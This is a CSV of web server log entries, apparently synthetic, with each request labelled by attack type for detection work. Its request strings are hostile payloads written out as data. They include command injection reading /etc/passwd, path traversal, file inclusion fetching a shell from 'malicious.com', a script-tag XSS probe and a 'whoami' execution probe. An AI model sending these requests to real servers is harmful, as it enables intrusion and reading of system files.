ip,timestamp,request,status,size,attack_type
131.85.145.211,2025-03-15 12:18:10,GET /api/user?username=admin HTTP/1.1,200,2173,API_ABUSE
50.241.127.175,2025-03-15 12:18:14,POST /wp-json/wp/v2/users HTTP/1.1,200,976,USER_ENUMERATION
8.171.148.27,2025-03-15 12:17:32,POST /upload-xml HTTP/1.1,200,1910,XXE_ATTACK
136.137.148.237,2025-03-15 12:17:59,GET /etc/passwd HTTP/1.1,200,1167,PATH_TRAVERSAL
105.182.163.130,2025-03-15 12:17:23,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4639,LFI_ATTACK
177.249.94.35,2025-03-15 12:18:11,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4492,LFI_ATTACK
118.69.191.147,2025-03-15 12:18:10,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1927,XSS_ATTACK
183.104.101.61,2025-03-15 12:17:50,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4741,COMMAND_INJECTION
224.153.150.198,2025-03-15 12:17:48,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,2045,COMMAND_INJECTION
6.202.236.122,2025-03-15 12:17:51,POST /wp-json/wp/v2/users HTTP/1.1,200,3249,USER_ENUMERATION
247.253.153.241,2025-03-15 12:17:28,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1228,REMOTE_FILE_INCLUSION
194.233.95.122,2025-03-15 12:17:44,GET /api/user?username=admin HTTP/1.1,200,4261,API_ABUSE
232.220.78.40,2025-03-15 12:18:00,POST /change-email?email=attacker@example.com HTTP/1.1,200,3038,CSRF_ATTACK
180.160.38.226,2025-03-15 12:17:52,GET /etc/passwd HTTP/1.1,200,4719,PATH_TRAVERSAL
236.112.21.246,2025-03-15 12:17:55,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,3404,LFI_ATTACK
112.167.168.194,2025-03-15 12:17:36,GET /api/user?username=admin HTTP/1.1,200,2479,API_ABUSE
6.122.175.220,2025-03-15 12:18:12,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4045,LFI_ATTACK
34.170.58.127,2025-03-15 12:17:23,GET /etc/passwd HTTP/1.1,200,4021,PATH_TRAVERSAL
64.111.20.16,2025-03-15 12:18:14,GET /api/user?username=admin HTTP/1.1,200,1460,API_ABUSE
248.14.28.161,2025-03-15 12:17:50,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,2784,REMOTE_FILE_INCLUSION
51.75.88.42,2025-03-15 12:17:42,POST /upload-xml HTTP/1.1,200,3646,XXE_ATTACK
59.226.96.123,2025-03-15 12:18:17,GET /execute?cmd=whoami HTTP/1.1,200,2579,RCE_ATTACK
234.112.41.239,2025-03-15 12:17:19,GET /execute?cmd=whoami HTTP/1.1,200,2334,RCE_ATTACK
170.215.191.246,2025-03-15 12:17:49,POST /wp-json/wp/v2/users HTTP/1.1,200,4473,USER_ENUMERATION
165.98.178.46,2025-03-15 12:18:16,POST /upload-xml HTTP/1.1,200,1726,XXE_ATTACK
184.213.205.93,2025-03-15 12:18:03,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,2773,LFI_ATTACK
57.5.236.172,2025-03-15 12:17:49,POST /change-email?email=attacker@example.com HTTP/1.1,200,2116,CSRF_ATTACK
60.145.200.251,2025-03-15 12:17:21,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4613,LFI_ATTACK
153.153.226.4,2025-03-15 12:17:49,GET /execute?cmd=whoami HTTP/1.1,200,2724,RCE_ATTACK
148.144.4.66,2025-03-15 12:17:54,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,1345,COMMAND_INJECTION
35.116.51.136,2025-03-15 12:17:21,POST /change-email?email=attacker@example.com HTTP/1.1,200,1911,CSRF_ATTACK
21.207.107.12,2025-03-15 12:17:34,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4378,LFI_ATTACK
24.253.107.242,2025-03-15 12:17:41,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,2677,XSS_ATTACK
56.16.166.246,2025-03-15 12:18:18,GET /execute?cmd=whoami HTTP/1.1,200,4095,RCE_ATTACK
238.117.125.45,2025-03-15 12:17:59,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4832,REMOTE_FILE_INCLUSION
2.69.253.122,2025-03-15 12:17:36,POST /upload-xml HTTP/1.1,200,1146,XXE_ATTACK
104.18.23.242,2025-03-15 12:18:07,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4623,LFI_ATTACK
73.244.97.253,2025-03-15 12:18:13,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3892,XSS_ATTACK
95.127.125.67,2025-03-15 12:17:38,POST /wp-json/wp/v2/users HTTP/1.1,200,3561,USER_ENUMERATION
98.46.88.182,2025-03-15 12:17:59,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,2179,REMOTE_FILE_INCLUSION
255.155.89.203,2025-03-15 12:18:10,POST /wp-json/wp/v2/users HTTP/1.1,200,3545,USER_ENUMERATION
246.220.114.106,2025-03-15 12:17:35,POST /wp-json/wp/v2/users HTTP/1.1,200,1690,USER_ENUMERATION
37.28.99.250,2025-03-15 12:18:08,GET /api/user?username=admin HTTP/1.1,200,1006,API_ABUSE
128.123.31.187,2025-03-15 12:17:28,GET /etc/passwd HTTP/1.1,200,4832,PATH_TRAVERSAL
33.76.223.174,2025-03-15 12:17:51,GET /api/user?username=admin HTTP/1.1,200,3555,API_ABUSE
206.63.235.243,2025-03-15 12:17:39,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,1209,LFI_ATTACK
33.6.198.85,2025-03-15 12:17:59,POST /wp-json/wp/v2/users HTTP/1.1,200,2673,USER_ENUMERATION
206.228.198.144,2025-03-15 12:17:35,POST /wp-json/wp/v2/users HTTP/1.1,200,926,USER_ENUMERATION
179.223.27.204,2025-03-15 12:18:19,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,2068,XSS_ATTACK
215.113.229.173,2025-03-15 12:18:21,GET /api/user?username=admin HTTP/1.1,200,2545,API_ABUSE
101.189.186.144,2025-03-15 12:18:03,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4428,REMOTE_FILE_INCLUSION
158.148.13.241,2025-03-15 12:17:37,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,857,XSS_ATTACK
110.242.40.76,2025-03-15 12:18:06,POST /wp-json/wp/v2/users HTTP/1.1,200,1441,USER_ENUMERATION
183.70.58.39,2025-03-15 12:17:35,GET /api/user?username=admin HTTP/1.1,200,1544,API_ABUSE
141.19.224.128,2025-03-15 12:18:00,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1448,REMOTE_FILE_INCLUSION
101.85.148.190,2025-03-15 12:17:44,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,2408,LFI_ATTACK
254.208.20.21,2025-03-15 12:17:49,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1532,REMOTE_FILE_INCLUSION
85.3.133.88,2025-03-15 12:18:10,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,1543,COMMAND_INJECTION
139.56.26.241,2025-03-15 12:18:14,POST /change-email?email=attacker@example.com HTTP/1.1,200,3285,CSRF_ATTACK
145.96.124.177,2025-03-15 12:17:34,POST /change-email?email=attacker@example.com HTTP/1.1,200,2677,CSRF_ATTACK
36.23.87.213,2025-03-15 12:18:17,POST /wp-json/wp/v2/users HTTP/1.1,200,4478,USER_ENUMERATION
90.62.3.60,2025-03-15 12:18:15,GET /api/user?username=admin HTTP/1.1,200,4591,API_ABUSE
165.168.64.170,2025-03-15 12:18:02,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4174,COMMAND_INJECTION
9.161.226.186,2025-03-15 12:17:52,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,3688,REMOTE_FILE_INCLUSION
193.6.109.238,2025-03-15 12:17:57,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,3906,COMMAND_INJECTION
226.116.28.218,2025-03-15 12:17:30,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3471,XSS_ATTACK
21.12.89.140,2025-03-15 12:17:32,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1986,XSS_ATTACK
210.154.92.203,2025-03-15 12:17:51,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,734,COMMAND_INJECTION
229.144.87.152,2025-03-15 12:18:04,GET /api/user?username=admin HTTP/1.1,200,4563,API_ABUSE
131.35.72.251,2025-03-15 12:17:55,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,2231,COMMAND_INJECTION
192.67.121.214,2025-03-15 12:18:14,GET /etc/passwd HTTP/1.1,200,3760,PATH_TRAVERSAL
53.222.133.127,2025-03-15 12:17:42,POST /upload-xml HTTP/1.1,200,4650,XXE_ATTACK
195.43.131.26,2025-03-15 12:17:48,POST /wp-json/wp/v2/users HTTP/1.1,200,4520,USER_ENUMERATION
110.234.204.191,2025-03-15 12:17:57,GET /execute?cmd=whoami HTTP/1.1,200,1813,RCE_ATTACK
9.202.161.114,2025-03-15 12:18:08,GET /etc/passwd HTTP/1.1,200,3297,PATH_TRAVERSAL
128.54.237.104,2025-03-15 12:18:03,GET /etc/passwd HTTP/1.1,200,2557,PATH_TRAVERSAL
117.195.14.147,2025-03-15 12:18:05,POST /change-email?email=attacker@example.com HTTP/1.1,200,3601,CSRF_ATTACK
209.0.253.154,2025-03-15 12:17:34,POST /upload-xml HTTP/1.1,200,1198,XXE_ATTACK
27.57.180.82,2025-03-15 12:17:55,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3916,XSS_ATTACK
165.66.102.144,2025-03-15 12:17:43,POST /change-email?email=attacker@example.com HTTP/1.1,200,3709,CSRF_ATTACK
103.185.55.23,2025-03-15 12:18:26,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4808,REMOTE_FILE_INCLUSION
99.127.95.54,2025-03-15 12:18:17,GET /execute?cmd=whoami HTTP/1.1,200,2463,RCE_ATTACK
6.89.199.114,2025-03-15 12:17:54,POST /change-email?email=attacker@example.com HTTP/1.1,200,1854,CSRF_ATTACK
229.246.103.76,2025-03-15 12:17:48,GET /execute?cmd=whoami HTTP/1.1,200,4972,RCE_ATTACK
4.133.89.32,2025-03-15 12:18:26,POST /wp-json/wp/v2/users HTTP/1.1,200,2029,USER_ENUMERATION
39.112.64.108,2025-03-15 12:17:27,POST /wp-json/wp/v2/users HTTP/1.1,200,600,USER_ENUMERATION
84.136.126.186,2025-03-15 12:18:21,GET /api/user?username=admin HTTP/1.1,200,1597,API_ABUSE
171.69.195.192,2025-03-15 12:18:15,POST /upload-xml HTTP/1.1,200,2778,XXE_ATTACK
226.94.65.208,2025-03-15 12:17:27,GET /api/user?username=admin HTTP/1.1,200,2002,API_ABUSE
214.98.142.207,2025-03-15 12:18:06,GET /api/user?username=admin HTTP/1.1,200,893,API_ABUSE
9.124.112.42,2025-03-15 12:17:29,GET /etc/passwd HTTP/1.1,200,1840,PATH_TRAVERSAL
65.89.43.174,2025-03-15 12:17:49,POST /wp-json/wp/v2/users HTTP/1.1,200,3901,USER_ENUMERATION
124.44.58.239,2025-03-15 12:17:59,POST /upload-xml HTTP/1.1,200,4206,XXE_ATTACK
245.181.230.77,2025-03-15 12:18:22,GET /api/user?username=admin HTTP/1.1,200,3134,API_ABUSE
118.53.80.74,2025-03-15 12:18:17,POST /upload-xml HTTP/1.1,200,1460,XXE_ATTACK
155.74.86.201,2025-03-15 12:17:30,GET /etc/passwd HTTP/1.1,200,3387,PATH_TRAVERSAL
133.106.15.179,2025-03-15 12:17:32,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,2973,LFI_ATTACK
209.91.13.45,2025-03-15 12:18:11,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,3487,LFI_ATTACK
229.88.248.194,2025-03-15 12:17:52,GET /api/user?username=admin HTTP/1.1,200,569,API_ABUSE
42.197.67.114,2025-03-15 12:17:29,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,2636,XSS_ATTACK
46.222.254.255,2025-03-15 12:18:03,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,2339,XSS_ATTACK
80.28.44.100,2025-03-15 12:17:50,POST /upload-xml HTTP/1.1,200,1239,XXE_ATTACK
209.144.151.52,2025-03-15 12:18:08,GET /execute?cmd=whoami HTTP/1.1,200,824,RCE_ATTACK
48.247.164.203,2025-03-15 12:18:18,POST /upload-xml HTTP/1.1,200,1370,XXE_ATTACK
26.216.245.22,2025-03-15 12:18:30,GET /etc/passwd HTTP/1.1,200,3643,PATH_TRAVERSAL
130.206.64.116,2025-03-15 12:17:56,POST /change-email?email=attacker@example.com HTTP/1.1,200,1993,CSRF_ATTACK
127.74.240.200,2025-03-15 12:18:05,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,3726,REMOTE_FILE_INCLUSION
222.74.22.101,2025-03-15 12:17:59,POST /wp-json/wp/v2/users HTTP/1.1,200,4960,USER_ENUMERATION
34.63.84.19,2025-03-15 12:17:47,GET /api/user?username=admin HTTP/1.1,200,3668,API_ABUSE
123.9.198.177,2025-03-15 12:17:44,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3370,XSS_ATTACK
136.178.180.148,2025-03-15 12:17:57,GET /api/user?username=admin HTTP/1.1,200,1413,API_ABUSE
5.219.120.21,2025-03-15 12:17:49,POST /wp-json/wp/v2/users HTTP/1.1,200,1700,USER_ENUMERATION
65.21.38.226,2025-03-15 12:18:07,GET /execute?cmd=whoami HTTP/1.1,200,4048,RCE_ATTACK
138.106.102.5,2025-03-15 12:18:20,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,2195,XSS_ATTACK
255.187.74.70,2025-03-15 12:17:46,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,572,REMOTE_FILE_INCLUSION
113.196.242.90,2025-03-15 12:17:36,GET /etc/passwd HTTP/1.1,200,2302,PATH_TRAVERSAL
190.122.164.62,2025-03-15 12:17:45,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,3021,COMMAND_INJECTION
238.12.42.224,2025-03-15 12:17:59,POST /upload-xml HTTP/1.1,200,563,XXE_ATTACK
204.229.78.172,2025-03-15 12:17:46,POST /upload-xml HTTP/1.1,200,853,XXE_ATTACK
216.74.93.190,2025-03-15 12:17:53,GET /execute?cmd=whoami HTTP/1.1,200,3600,RCE_ATTACK
121.162.185.207,2025-03-15 12:17:41,GET /execute?cmd=whoami HTTP/1.1,200,1802,RCE_ATTACK
57.169.148.167,2025-03-15 12:18:29,GET /api/user?username=admin HTTP/1.1,200,2236,API_ABUSE
89.73.117.84,2025-03-15 12:17:38,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3888,XSS_ATTACK
214.11.235.84,2025-03-15 12:17:48,GET /api/user?username=admin HTTP/1.1,200,3965,API_ABUSE
142.91.18.192,2025-03-15 12:18:06,POST /upload-xml HTTP/1.1,200,2323,XXE_ATTACK
201.223.44.25,2025-03-15 12:17:53,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,2493,XSS_ATTACK
14.182.243.154,2025-03-15 12:17:50,POST /wp-json/wp/v2/users HTTP/1.1,200,2021,USER_ENUMERATION
71.118.102.250,2025-03-15 12:17:47,POST /upload-xml HTTP/1.1,200,2000,XXE_ATTACK
157.155.16.247,2025-03-15 12:18:29,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,3190,LFI_ATTACK
71.175.105.57,2025-03-15 12:18:01,GET /execute?cmd=whoami HTTP/1.1,200,4333,RCE_ATTACK
55.81.214.236,2025-03-15 12:17:48,GET /execute?cmd=whoami HTTP/1.1,200,1625,RCE_ATTACK
206.86.235.63,2025-03-15 12:17:56,POST /wp-json/wp/v2/users HTTP/1.1,200,2883,USER_ENUMERATION
24.208.72.123,2025-03-15 12:17:52,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,2517,COMMAND_INJECTION
42.128.40.146,2025-03-15 12:18:05,GET /etc/passwd HTTP/1.1,200,1822,PATH_TRAVERSAL
194.204.50.202,2025-03-15 12:18:08,POST /upload-xml HTTP/1.1,200,4908,XXE_ATTACK
120.176.253.192,2025-03-15 12:17:59,POST /change-email?email=attacker@example.com HTTP/1.1,200,2342,CSRF_ATTACK
106.231.149.26,2025-03-15 12:21:01,POST /change-email?email=attacker@example.com HTTP/1.1,200,4119,CSRF_ATTACK
98.26.180.205,2025-03-15 12:21:53,GET /api/user?username=admin HTTP/1.1,403,4186,API_ABUSE
196.54.82.59,2025-03-15 12:21:40,GET /api/user?username=admin HTTP/1.1,403,4421,API_ABUSE
167.93.91.225,2025-03-15 12:21:14,POST /upload-xml HTTP/1.1,403,2456,XXE_ATTACK
224.135.114.181,2025-03-15 12:21:20,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,1853,LFI_ATTACK
137.114.222.15,2025-03-15 12:21:20,POST /upload-xml HTTP/1.1,403,3021,XXE_ATTACK
74.85.24.115,2025-03-15 12:21:40,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1120,XSS_ATTACK
247.245.71.30,2025-03-15 12:21:14,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,999,LFI_ATTACK
168.201.73.199,2025-03-15 12:21:00,GET /execute?cmd=whoami HTTP/1.1,403,3493,RCE_ATTACK
57.106.195.144,2025-03-15 12:20:58,GET /etc/passwd HTTP/1.1,403,835,PATH_TRAVERSAL
40.123.163.253,2025-03-15 12:21:19,POST /upload-xml HTTP/1.1,403,3293,XXE_ATTACK
199.155.97.171,2025-03-15 12:21:06,POST /upload-xml HTTP/1.1,403,1176,XXE_ATTACK
9.106.99.96,2025-03-15 12:21:50,GET /api/user?username=admin HTTP/1.1,403,3888,API_ABUSE
154.208.88.19,2025-03-15 12:21:22,GET /etc/passwd HTTP/1.1,403,3670,PATH_TRAVERSAL
215.20.250.231,2025-03-15 12:21:21,GET /execute?cmd=whoami HTTP/1.1,403,4280,RCE_ATTACK
15.30.117.152,2025-03-15 12:21:33,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1887,XSS_ATTACK
154.235.145.214,2025-03-15 12:21:06,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,2981,XSS_ATTACK
203.137.40.120,2025-03-15 12:21:36,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,4280,XSS_ATTACK
238.222.235.20,2025-03-15 12:21:55,POST /wp-json/wp/v2/users HTTP/1.1,403,3137,USER_ENUMERATION
93.34.253.202,2025-03-15 12:21:54,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4296,LFI_ATTACK
214.179.202.100,2025-03-15 12:21:53,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,2955,COMMAND_INJECTION
225.128.71.57,2025-03-15 12:21:11,GET /execute?cmd=whoami HTTP/1.1,403,2747,RCE_ATTACK
159.221.123.125,2025-03-15 12:21:49,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,2751,XSS_ATTACK
15.110.142.173,2025-03-15 12:21:08,GET /execute?cmd=whoami HTTP/1.1,403,565,RCE_ATTACK
34.172.111.31,2025-03-15 12:21:37,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,2178,COMMAND_INJECTION
144.248.210.179,2025-03-15 12:21:24,GET /execute?cmd=whoami HTTP/1.1,403,1562,RCE_ATTACK
40.32.219.232,2025-03-15 12:21:45,POST /wp-json/wp/v2/users HTTP/1.1,403,4474,USER_ENUMERATION
33.143.172.157,2025-03-15 12:21:27,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,3195,COMMAND_INJECTION
170.215.175.142,2025-03-15 12:21:53,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,3512,LFI_ATTACK
240.15.111.88,2025-03-15 12:21:50,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,4591,XSS_ATTACK
219.92.90.6,2025-03-15 12:21:24,GET /execute?cmd=whoami HTTP/1.1,403,4084,RCE_ATTACK
44.241.179.140,2025-03-15 12:21:47,GET /api/user?username=admin HTTP/1.1,403,4149,API_ABUSE
253.175.131.171,2025-03-15 12:21:40,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4667,REMOTE_FILE_INCLUSION
213.48.128.105,2025-03-15 12:21:43,GET /etc/passwd HTTP/1.1,403,545,PATH_TRAVERSAL
247.233.48.132,2025-03-15 12:21:14,GET /execute?cmd=whoami HTTP/1.1,403,2669,RCE_ATTACK
171.120.154.179,2025-03-15 12:21:22,GET /etc/passwd HTTP/1.1,403,2407,PATH_TRAVERSAL
121.125.58.18,2025-03-15 12:21:55,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4605,LFI_ATTACK
103.173.191.143,2025-03-15 12:21:48,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,2155,COMMAND_INJECTION
243.209.33.111,2025-03-15 12:21:22,POST /upload-xml HTTP/1.1,403,1464,XXE_ATTACK
12.49.206.159,2025-03-15 12:21:09,GET /execute?cmd=whoami HTTP/1.1,403,4363,RCE_ATTACK
43.9.8.132,2025-03-15 12:21:55,POST /wp-json/wp/v2/users HTTP/1.1,403,1236,USER_ENUMERATION
12.98.50.192,2025-03-15 12:21:26,GET /api/user?username=admin HTTP/1.1,403,1111,API_ABUSE
91.152.13.54,2025-03-15 12:21:00,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1943,XSS_ATTACK
65.180.197.155,2025-03-15 12:21:03,POST /change-email?email=attacker@example.com HTTP/1.1,200,4199,CSRF_ATTACK
52.91.173.148,2025-03-15 12:21:02,POST /upload-xml HTTP/1.1,403,917,XXE_ATTACK
215.61.184.213,2025-03-15 12:21:35,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4319,REMOTE_FILE_INCLUSION
240.212.92.73,2025-03-15 12:21:51,GET /execute?cmd=whoami HTTP/1.1,403,842,RCE_ATTACK
226.202.78.201,2025-03-15 12:21:39,GET /api/user?username=admin HTTP/1.1,403,4748,API_ABUSE
8.28.197.136,2025-03-15 12:21:07,POST /change-email?email=attacker@example.com HTTP/1.1,200,2242,CSRF_ATTACK
38.101.41.156,2025-03-15 12:21:56,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4681,LFI_ATTACK
190.83.119.11,2025-03-15 12:21:34,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1334,XSS_ATTACK
15.57.172.207,2025-03-15 12:21:44,POST /change-email?email=attacker@example.com HTTP/1.1,200,3277,CSRF_ATTACK
16.190.90.139,2025-03-15 12:21:28,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,2964,COMMAND_INJECTION
159.31.88.32,2025-03-15 12:21:53,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,3087,LFI_ATTACK
214.1.99.10,2025-03-15 12:21:56,GET /execute?cmd=whoami HTTP/1.1,403,3692,RCE_ATTACK
219.79.7.218,2025-03-15 12:21:49,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1421,XSS_ATTACK
170.157.30.233,2025-03-15 12:21:35,POST /change-email?email=attacker@example.com HTTP/1.1,200,1156,CSRF_ATTACK
155.117.143.171,2025-03-15 12:21:13,POST /wp-json/wp/v2/users HTTP/1.1,403,1310,USER_ENUMERATION
182.192.5.46,2025-03-15 12:21:52,POST /change-email?email=attacker@example.com HTTP/1.1,200,3459,CSRF_ATTACK
64.126.221.186,2025-03-15 12:21:16,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,3978,COMMAND_INJECTION
49.238.14.60,2025-03-15 12:21:42,POST /wp-json/wp/v2/users HTTP/1.1,403,4200,USER_ENUMERATION
232.134.196.205,2025-03-15 12:21:46,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4236,REMOTE_FILE_INCLUSION
2.6.48.239,2025-03-15 12:21:31,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,2744,LFI_ATTACK
208.105.141.115,2025-03-15 12:21:41,GET /api/user?username=admin HTTP/1.1,403,4725,API_ABUSE
27.127.69.44,2025-03-15 12:21:05,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,1231,LFI_ATTACK
25.37.189.145,2025-03-15 12:21:39,POST /wp-json/wp/v2/users HTTP/1.1,403,4845,USER_ENUMERATION
17.191.251.167,2025-03-15 12:21:29,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,2156,LFI_ATTACK
127.179.251.86,2025-03-15 12:21:48,POST /upload-xml HTTP/1.1,403,4185,XXE_ATTACK
79.30.132.101,2025-03-15 12:21:23,GET /etc/passwd HTTP/1.1,403,1089,PATH_TRAVERSAL
201.106.223.206,2025-03-15 12:21:03,POST /change-email?email=attacker@example.com HTTP/1.1,200,1932,CSRF_ATTACK
159.87.214.163,2025-03-15 12:21:36,GET /execute?cmd=whoami HTTP/1.1,403,4463,RCE_ATTACK
119.106.34.184,2025-03-15 12:21:04,POST /change-email?email=attacker@example.com HTTP/1.1,200,3517,CSRF_ATTACK
177.166.4.35,2025-03-15 12:21:21,POST /upload-xml HTTP/1.1,403,2873,XXE_ATTACK
242.133.48.109,2025-03-15 12:21:40,GET /api/user?username=admin HTTP/1.1,403,2160,API_ABUSE
193.59.193.55,2025-03-15 12:22:03,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,2514,REMOTE_FILE_INCLUSION
175.125.176.123,2025-03-15 12:21:44,POST /upload-xml HTTP/1.1,403,4185,XXE_ATTACK
106.56.129.178,2025-03-15 12:21:52,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4718,REMOTE_FILE_INCLUSION
206.8.148.157,2025-03-15 12:21:59,GET /execute?cmd=whoami HTTP/1.1,403,4241,RCE_ATTACK
112.172.166.145,2025-03-15 12:21:59,GET /api/user?username=admin HTTP/1.1,403,2534,API_ABUSE
247.185.100.135,2025-03-15 12:21:51,GET /etc/passwd HTTP/1.1,403,3096,PATH_TRAVERSAL
88.222.155.212,2025-03-15 12:21:13,POST /wp-json/wp/v2/users HTTP/1.1,403,4170,USER_ENUMERATION
69.37.148.177,2025-03-15 12:21:58,POST /wp-json/wp/v2/users HTTP/1.1,403,1830,USER_ENUMERATION
75.217.226.116,2025-03-15 12:21:09,GET /etc/passwd HTTP/1.1,403,2495,PATH_TRAVERSAL
2.83.127.170,2025-03-15 12:21:44,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,2066,COMMAND_INJECTION
159.157.189.218,2025-03-15 12:21:55,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,1048,COMMAND_INJECTION
72.237.70.137,2025-03-15 12:22:02,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,2812,REMOTE_FILE_INCLUSION
191.215.65.148,2025-03-15 12:21:51,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,2762,XSS_ATTACK
134.38.80.3,2025-03-15 12:21:36,GET /etc/passwd HTTP/1.1,403,4707,PATH_TRAVERSAL
65.200.233.224,2025-03-15 12:21:24,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,794,XSS_ATTACK
21.84.8.223,2025-03-15 12:21:36,POST /wp-json/wp/v2/users HTTP/1.1,403,4233,USER_ENUMERATION
